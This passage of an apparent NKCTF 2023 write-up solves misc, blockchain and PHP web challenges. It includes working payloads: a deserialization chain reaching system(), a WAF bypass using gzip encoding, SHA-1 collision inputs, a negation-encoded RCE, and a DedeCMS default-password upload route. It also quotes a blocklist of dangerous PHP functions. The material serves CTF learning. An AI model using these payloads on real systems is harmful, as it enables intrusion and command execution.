y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp">easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png12.png" srcset="/img/loading.gif" lazyload alt=""></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music">baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png13.png" srcset="/img/loading.gif" lazyload alt=""></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster">THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="/img/blog_img/NKCTF/page_Image/png14.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h1>Blockchain</h1><h2 id="SignIn">SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="/img/blog_img/NKCTF/page_Image/png15.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="HelloWorld">HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="/img/blog_img/NKCTF/page_Image/png16.png" srcset="/img/loading.gif" lazyload alt=""></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png17.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="/img/blog_img/NKCTF/page_Image/png18.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="decompile-revenge">decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img src="/img/blog_img/NKCTF/page_Image/png19.png" srcset="/img/loading.gif" lazyload alt=""></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1>web</h1><h2 id="baby-php">baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png20.png" srcset="/img/loading.gif" lazyload alt=""></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="/img/blog_img/NKCTF/page_Image/png21.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="eazy-php">eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms">easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 